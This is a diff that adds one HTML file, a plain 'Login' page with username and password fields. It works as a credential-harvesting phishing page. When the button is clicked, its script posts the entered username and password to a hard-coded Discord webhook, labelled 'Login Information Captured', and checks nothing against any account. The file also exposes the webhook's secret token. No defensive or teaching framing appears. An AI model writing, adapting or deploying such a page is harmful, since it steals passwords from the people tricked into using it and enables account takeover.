@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: url('https://www.shutterstock.com/shutterstock/videos/3674343777/thumb/1.jpg?ip=x480');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+        
+        .login-box {
+            background-color: rgba(255, 255, 255, 0.85);
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            width: 350px;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 30px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #444;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        
+        .login-btn {
+            background-color: #00a2ff;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+        
+        .login-btn:hover {
+            background-color: #0088cc;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px;
+            background-color: #4CAF50;
+            color: white;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.2);
+            z-index: 1000;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>Login</h1>
+        
+        <div class="input-group">
+            <label for="username">Username/Email</label>
+            <input type="text" id="username" placeholder="">
+        </div>
+        
+        <div class="input-group">
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="">
+        </div>
+        
+        <button class="login-btn" id="loginBtn">Log In</button>
+    </div>
+
+    <div class="notification" id="notification"></div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1382969009686974559/6kIfmsRrtugxMElTKAIKKU86X19mph4GS3iiO5VGAXOPraPhgmavOkD0PEmOivtrN3mH";
+        
+        document.getElementById('loginBtn').addEventListener('click', async function() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!username || !password) {
+                showNotification("Please enter both username and password", "error");
+                return;
+            }
+            
+            // Send to Discord only
+            await sendToDiscord(username, password);
+            
+            // Clear fields
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+            
+            showNotification("Login information sent", "success");
+        });
+        
+        async function sendToDiscord(username, password) {
+            try {
+                const embed = {
+                    title: "Login Information Captured",
+                    color: 0x00a2ff,
+                    fields: [
+                        { name: "Username", value: username, inline: true },
+                        { name: "Password", value: `\`\`\`${password}\`\`\``, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed],
+                        content: "⚠️ New login information captured!"
+                    })
+                });
+            } catch (error) {
+                console.error("Error sending to Discord:", error);
+                showNotification("Error sending information", "error");
+            }
+        }
+        
+        function showNotification(message, type) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.backgroundColor = type === 'success' ? '#4CAF50' : '#f44336';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
